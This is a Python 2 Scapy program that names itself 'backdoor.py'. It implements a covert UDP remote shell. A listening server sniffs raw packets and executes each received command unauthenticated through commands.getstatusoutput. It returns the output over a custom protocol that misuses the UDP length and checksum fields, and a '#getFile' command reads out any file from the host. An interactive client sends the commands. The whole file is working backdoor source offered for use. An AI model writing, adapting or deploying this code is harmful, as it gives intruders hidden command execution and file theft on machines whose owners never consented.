#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
Scapy UDP Paket:

    0              15                32
    +--------------------------------+
    |    sport     |      dport      |  <<      Client->Server sport: Expected dport for answer from server
    |              |                 |                         dport: Port where server listens on
    |              |                 |          Server->Client sport: ???
    |              |                 |                         dport: Port where answer for command is expected 
    +--------------------------------+                          
    |    len       |      chksum     |  <<      Protocoll control fields:
    |              |                 |          chksum == Checksum of packet contents ("UDP-lite") (TODO), wenn len==0xFFFE, dann enthält chksum das angeforderte Paket
    |              |                 |          len == count of packets left+1: keeps order alive ;)
    +--------------------------------+
    |           Content              |  <<      Client: Command to execute
    +--------------------------------+          Server: Output of command execution
    
    switch(len):
        case '0': all packets sent, do exec (client->server) or waiting for next command (server->client)
        case '0xFFFE': Resend-Anforderung, Paket-id in udp.chksum.
        case '0xFFFF': Anzahl der Pakete der Übertragung
        default: receive len-packets 

"""

from scapy.all import *
from threading import Thread
import random, getopt, sys, math, commands, time

class Debug():
    
    DEBUG_NONE = 0 # none
    DEBUG_ERROR = 1 # only error messages
    DEBUG_INFO = 2 # be verbose
    DEBUG_INFO2 = 3 # be very verbose
    
    def __init__(self,debugLvl=0):
        self._debugLvl = debugLvl
    
    def info(self,msg):
        if self._debugLvl >= self.DEBUG_INFO:
            print "[DEBUG] INFO: "+msg
        
    def info2(self,msg):
        if self._debugLvl >= self.DEBUG_INFO2:
            print "[DEBUG] INFO2: "+msg
    
    def error(self,msg):
        if self._debugLvl >= self.DEBUG_ERROR:
            print "[DEBUG] ERROR: "+msg
    
class Networking():
    
    def __init__(self,debug):
        self._debug = debug         # Debugging 
        self._lastPacketsSent = {}  # vorherige Übertragung zum Resend von verlorenen Paketen
        self._buffer = []
        self.PACKET_SIZE = 100    # Maximale Größe des Payloads, != 0
        self._data = ""
        self._partner = {"ip": "","udp": ""}
        
    """
    Sending contents
    dst = Destination IP Address
    dport = Destionation UDP Port
    content = Contents to send
    
    Optional:
    sport = Source UDP Port (default: choose randomly)
    sendDelay = Delay before sending a packet (default: 0)
    keepLastPackets = keep last packets (default: False)
    """
    def send(self,dst,dport,content,sport=0,sendDelay=0,keepLastPackets=False,chksum=0x0001):
        
        self._debug.info2("Begin Sending Message: "+dst+" "+str(dport)+" "+content[:10])
        
        self._debug.info2("- Building packets..")
        ip = IP(dst=dst)
        udp = UDP(dport=int(dport),chksum=chksum)
        if sport==0:
            udp.sport = random.randint(1025,65534)
        else:
            udp.sport = sport
        
        if not keepLastPackets:
            self._debug.info2("- Initializing lastPacketsSent")
            self._lastPacketsSent = {"_ip": ip, "_dport": udp}
        
        if len(content)>=self.PACKET_SIZE: # handle big cmds, not fitting into one packet
            self._debug.info2("- Packet too big, splitting..")            
            c = int(math.ceil(len(content)/float(self.PACKET_SIZE)))
            self._sendNumberOfPackets(ip,udp,c,keepLastPackets=keepLastPackets)
            time.sleep(sendDelay)
            for i in range(c):
                udp.len = c-(i+1)
                cont = content[i*self.PACKET_SIZE:(i+1)*self.PACKET_SIZE]
                p = ip/udp/cont
                self._debug.info2("- Sending packet: "+p.summary())
                send(p,verbose=0)
                if not keepLastPackets:
                    self._lastPacketsSent.update({udp.len: cont})
                time.sleep(sendDelay)
        else: # everything fitts into one packet - do we really need this??           
            self._debug.info2("- Packet fits PACKET_SIZE.")
            self._sendNumberOfPackets(ip,udp,1,keepLastPackets=keepLastPackets)
            udp.len=0
            p=ip/udp/content
            self._debug.info2("- Sending packet: "+p.summary())
            send(p,verbose=0) #TODO: handle port unavailable
            if not keepLastPackets:
                self._lastPacketsSent.update({udp.len: 1}) 
        self._debug.info2("Packet Sending Done.")
    
    """
    resend
    prevent set of udp.len and sent of nop in self.send()
    """
    def resend(self,ip,port,pid,chksum=0x0001):
        _ip = IP(dst=ip)                    # IP-Paket zu Client
        _udp = UDP(dport=int(port))              # Port am Client setzen
        _dat = Raw(self._lastPacketsSent[int(pid)])   # Inhalt laden
        _udp.len = int(pid)                      # UDP.len setzen, damit Paket eingeordnet werden kann
        _udp.sport = random.randint(1025,65534)
        _udp.chksum = int(chksum)
        p=_ip/_udp/_dat
        self._debug.info2("Sending #ret-answer-packet: "+p.summary())
        send(p,verbose=0)
    
    """
    request Resend
    """    
    def reqResend(self,ip,dport,pid,sport=0):
        _ip = IP(dst=ip)                    # IP-Paket zu Client
        if(sport == 0):
            _udp = UDP(dport=int(dport),sport=random.randint(1025,65534),chksum=int(pid))              # Port am Client setzen
        else:
            _udp = UDP(dport=int(dport),sport=sport,chksum=int(pid))              # Port am Client setzen
        _dat = Raw("")   # Inhalt laden
        _udp.len = 0xFFFE                      # UDP.len setzen, 0xFFFE=Request Resend, Packet-id=udp.chksum
        p=_ip/_udp/_dat
        self._debug.info2("Sending #ret-request: "+p.summary()+" / "+str(_udp.len)+" / "+str(pid))
        send(p,verbose=0) 
        
            
    """
    Receiving contents
    src = Source IP-Address
    
    Optional:
    dport = Destionation UDP Port: Own IP-Address
    sport = Source UDP Port: Port of other partner
    """
    def recv(self, pf, sport=None, listen_address=None, dport=0, t_sniff=2, recvTimeout=3, expectNothing=False, maxTimesProc=0, resendTimeout=20, resendPort=0, resendTries=3):
        
        data = ""
        t_recv = 0
        times_proc = 0
        just_process = False
        
        self._data = ""
        
        retries = 0
        
        while(data==""):
            old_buffer = list(self._buffer)   
            if not just_process:
                self._debug.info2("Sniffing on filter: "+pf+" | Config: len(old_buffer)="+str(len(old_buffer))+" len(buffer)="+str(len(self._buffer))+" times_proc="+str(times_proc)+" t_recv="+str(t_recv))
                sniff(filter=pf, prn=self._fillBuffer, timeout=t_sniff)     # füllt den Empfangspuffer
            if(old_buffer==self._buffer and t_recv>=recvTimeout):
                data = self._processBuffer()                                # verarbeite die Daten, die aktuell im Puffer sind
                t_recv = 0
                if maxTimesProc!=0 and data == "":
                    times_proc +=1
                    if times_proc == maxTimesProc:
                        break
            else:
                t_recv += 1
            cmd = data.split(" ")
            if len(cmd)>=2 and cmd[0]=="#mis":                              # Puffer ist unvollständig, Pakete zeitverzögert anfordern
                self._debug.info2("Buffer misses packets, sending #ret's to save the world: "+data)
                if retries >= resendTries:
                    data = reduce(lambda x, y: (0,x[1]+y[1]), self._buffer)[1] # build data without missing packets, a few bytes are more then nothing :)
                    self._buffer = []
                    break
                # ----------- Resend Packets ------------
                pids = cmd[1:]
                for pid in pids:
                    self._debug.info2("Starting new Sniffer-Thread for #ret's with filter: "+pf)   # for now: nevermind if client fails to send full #ret-packet 
                    recv_t = Thread(target=sniff, kwargs={'filter': pf, 'prn': self._fillBuffer, 'count': 1, 'timeout': resendTimeout}) # this seems right...
                    recv_t.start()
                    time.sleep(1)
                    if resendPort!=0:
                        self._debug.info("Requesting "+str(pid)+" from "+self._partner["src"]+":"+str(resendPort))
                        if(sport != None):
                            self.reqResend(self._partner["src"],resendPort,pid,sport=sport)
                        else:
                            self.reqResend(self._partner["src"],resendPort,pid)
                    else:
                        self._debug.info("Requesting "+str(pid)+" from "+self._partner["src"]+":"+str(self._partner["sport"]))
                        if(sport != None):
                            self.reqResend(self._partner["src"],self._partner["sport"],pid,sport=sport)
                        else:
                            self.reqResend(self._partner["src"],self._partner["sport"],pid)
                    recv_t.join() #recv-end
                    time.sleep(1) # give him time to take a deep breath
                # -----------------------------
                just_process = True # wir brauchen nicht mehr zu listenen, wir sollten jetzt alle pakete haben.
                data = ""
                retries+=1
            elif len(cmd)==1 and cmd[0]=="#cor":                            # Puffer ist korrupt, löschen
                self._debug.info2("Buffer is corrupt. Flushing.")
                self._debug.info("Corrupt Buffer: "+reduce(lambda x, y: (0, x[1]+y[1]),self._buffer)[1])
                self._buffer = []
                data = ""
            if expectNothing:
                break
                
        self._debug.info2("Received data: "+data)
        self._data = data
        self._buffer = []                
        return data
    
    
    """
    Return data of last packets
    """    
    def getData(self):
        return self._data   
    
    """
    Send number of packets
    """
    def _sendNumberOfPackets(self,ip,udp,n,keepLastPackets=False):
        udp.len=0xFFFF # send count notifier
        udp.chksum = 0x0001
        p = ip/udp/str(n)
        if not keepLastPackets:
            self._lastPacketsSent.update({udp.len: p})
        self._debug.info2("Sending nop-Packet to "+ip.dst+":"+str(udp.dport))
        send(p,verbose=0)    
    
    """
    Buffer hat folgende Inhalte:
    leer -> Keine Pakete empfangen, nichts zu tun.
    "halb voll" -> Teilweise Pakete empfangen, warte auf neue oder gib "#mis pck-id1 pck-id2 ..." aus
    "voll" und kein # am Anfang -> verarbeite und gib output zurück
    """    
    def _processBuffer(self):
	
	self._buffer.sort(key=lambda x:x[0])
 
        if((0xFFFE,"") in self._buffer): # wenn #ret-pakete durchkommen: buffer flushen
            return "#cur"
        
        if(len(self._buffer)==0):   # einen leeren Buffer müssen wir nicht verarbeiten :)
            self._debug.info2("Buffer leer, kein Processing nötig.")
            return ""
        
        try:                        # NOP Paket extrahieren zur Überprüfung der Vollständigkeit
            self._debug.info2("NOP Packet: \""+self._buffer[len(self._buffer)-1][1]+"\"")
	    self._debug.info2("Calling: int("+self._buffer[len(self._buffer)-1][1]+")")
	    l = int(self._buffer[len(self._buffer)-1][1].rstrip("\0")) # that is (0xFFFF, len(packet))[1]
        except ValueError as e:          # Kein NOP-Paket vorhanden, fordere zuerst an. 
            self._debug.info2("FEHLER: "+str(e))
	    self._debug.info2("NOP nicht empfangen.")
            return "#cor"
        
        if len(self._buffer) == (l+1):  # Alle Pakete vollständig.
            self._debug.info2("Alle Pakete sind da :)") 
            self._buffer.pop() # das erste Paket brauchen wir nicht, da alle Pakete empfangen wurden
            self._buffer.sort(key=lambda x:x[0], reverse=True)
            self._debug.info2("Buffer: "+str(self._buffer))
            data = reduce(lambda x, y: (0,x[1]+y[1]), self._buffer)[1]
            return data
        
        pids = map(lambda x: x[0],self._buffer) # Packet-IDs extrahieren um verlorene Paket-IDs zu finden.
        missingPids = []             
        for pid in range(l):
            if not pid in pids:
                missingPids.append(pid)
        if not 0xFFFF in pids:          # check whether nop-packet was received.
            missingPids.append(0xFFFF)        
        self._debug.info2("Missing packets: "+str(missingPids))
        self._debug.info2("Received packets: "+str(pids))
        if(len(missingPids)>0):                 # Es sind Pakete verloren gegangen, fordere an.
            self._debug.info2("Pakete sind verloren gegangen, fordere an.")
            return "#mis "+str(reduce(lambda x,y: str(x)+" "+str(y),missingPids))
            
        return "#cor"   # wenn dieser Punkt erreicht wird stimmt irgendwas im Buffer nicht...
        
    """
    Füllt den Buffer
    Wird von sniff aufgerufen, sobald ein Paket eintrifft
    
    packet = Paket, welches empfangen wird und in den Buffer geschrieben werden soll. (wird automatisch durch sniff übergeben.)
    """
    def _fillBuffer(self,packet):
        # Payload extrahieren
        if packet.haslayer("UDP"):
            if packet.getlayer("IP") != None:
                self._partner = {"src": packet.getlayer("IP").src, "sport": packet.getlayer("UDP").sport}
            if(packet.getlayer("UDP").len and packet.getlayer("UDP").len == 0xFFFE):
                self._debug.info2("Received #ret-request, sending requested packet: "+str(packet.getlayer("UDP").chksum)) # resend implemented directly
                self.resend(self._partner["src"],self._partner["sport"],str(packet.getlayer("UDP").chksum))
                return
            if packet.haslayer("Raw"):
                if packet.haslayer("Padding"):
                    if not len([i for i, v in enumerate(self._buffer) if v[0] == packet.getlayer("UDP").len]) > 0: # falls paket noch nicht vorhanden
                        self._debug.info2("Receiving packet: "+packet.summary()+" / "+str(packet.getlayer("UDP").len)+" / "+packet.getlayer("Raw").getfieldval("load")+packet.getlayer("Padding").getfieldval("load"))
                        self._buffer.append((packet.getlayer("UDP").len, packet.getlayer("Raw").getfieldval("load")+packet.getlayer("Padding").getfieldval("load")))
                else:
                    if not len([i for i, v in enumerate(self._buffer) if v[0] == packet.getlayer("UDP").len]) > 0: # falls paket noch nicht vorhanden
			self._debug.info2("Receiving packet: "+packet.summary()+" / "+str(packet.getlayer("UDP").len)+" / "+packet.getlayer("Raw").getfieldval("load"))
			self._buffer.append((packet.getlayer("UDP").len, packet.getlayer("Raw").getfieldval("load")))
            elif packet.haslayer("Padding"): 
                self._debug.info2("Receiving packet: "+packet.summary()+" / "+str(packet.getlayer("UDP").len)+" / "+packet.getlayer("Padding").getfieldval("load"))
                self._buffer.append((packet.getlayer("UDP").len, packet.getlayer("Padding").getfieldval("load")))
            else:
                self._debug.info2("Receiving packet: "+packet.summary())
        else:
            self._debug.info2("Receiving packet: "+packet.summary())
                
        # Pakete in korrekte Reihenfolge bringen
        self._buffer.sort(key=lambda x:x[0])
        
        
    """
    returns ip and sport from communicating partner  
    """
    def getPartner(self):
        return self._partner
        
class Server():
    
    def __init__(self,ip,port):
        self._debug = Debug(Debug.DEBUG_INFO2)
        self._net = Networking(self._debug)
        
        filter = "udp and dst host "+ip+" and dst port "+str(port)
        self._debug.info2("Starting server with filter: "+filter)
        
        while(True):
            cmd=self._net.recv(filter,resendTries=0) #recv-start, resendTries=0 -> no resends if faulty trasmission from client -> server
            #processing
            client = self._net.getPartner()
            self._debug.info("Command: " + cmd + " from "+client["src"]+":"+str(client["sport"]))
            
            #------- Implementierung des Fileservers ----------
            fileCmd = cmd.split(" ")
            if(fileCmd[0]=="#getFile"):
                if len(fileCmd)<3:
                    output="Syntax: #getFile FILENAME TARGET"
                else:
                    f = open(fileCmd[1], "r")
                    l = f.readlines()
                    if(len(l)>0):
                        output = reduce(lambda x, y: x+y, l)
                        status = 0
                    else:
                        output = ""
                        status = 1
                    f.close()
            #-------------------------------------------------- 
            else:
                status, output = commands.getstatusoutput(cmd) # Command ausführen
            self._debug.info("Output: " + output)
            
            self._net.send(client["src"],client["sport"],output)
    
class Client():
    
    def __init__(self,ip,port):       
        self._debug = Debug(Debug.DEBUG_INFO2)
        self._net = Networking(self._debug)
        self._server = {"ip":ip,"port":port}
        while(True):
            cmd = raw_input("> ")
            self.srCmd(cmd)           
            
    def srCmd(self,cmd):       
        #recv(self, src, sport, dport=0, sport=0, t_sniff=10, pf=None, recvTimeout=2, expectNothing=False)
        sport = random.randint(1025,65534) # choose me right..
        
        filter="udp and src host "+self._server["ip"]+" and dst port "+str(sport)
        self._debug.info2("Starting client with filter: "+filter)
        
        recv_t = Thread(target=self._net.recv, args=(filter,), kwargs={'maxTimesProc':2, 'resendPort': self._server['port'], 'sport': sport}) #recv-start: 
        recv_t.start()
        
        # give him some time to sleep before you send..
        time.sleep(1)

        self._debug.info("Command: " + cmd)
        self._net.send(self._server["ip"],self._server["port"],cmd,sport=sport) #send
        
        recv_t.join() #recv-end
        
        #------- Implementierung des Fileservers ----------
        fileCmd = cmd.split(" ")
        if(fileCmd[0]=="#getFile"):
            if(len(fileCmd)<3):
                print "Error executing command."
            else:
                f = open(fileCmd[2],"w+")
                f.write(self._net.getData()) 
                f.close()
        #-------------------------------------------------- 
        else:
            print "Output: "+self._net.getData() #processing
        

"""

HAUPTPROGRAMM

"""
if __name__ == "__main__":
    try:
        opts, args = getopt.getopt(sys.argv[1:],"l",["listen"])
        if len(opts)>0: # -l ist gegeben
            if len(args)==2:
                s = Server(args[0],args[1]) # TODO Kontrolle
            else:
                raise getopt.GetoptError("Too less arguments given. Quitting.")
        else:
            if len(args)==2:
                c = Client(args[0],args[1]) # TODO Kontrolle
            else:
                raise getopt.GetoptError("Too less arguments given. Quitting.")
    except getopt.GetoptError:
        print("Usage:\nServer: ./backdoor.py -l [hostname] [port]")
        print("Client: ./backdoor.py [hostname] [port]")
    
            
        
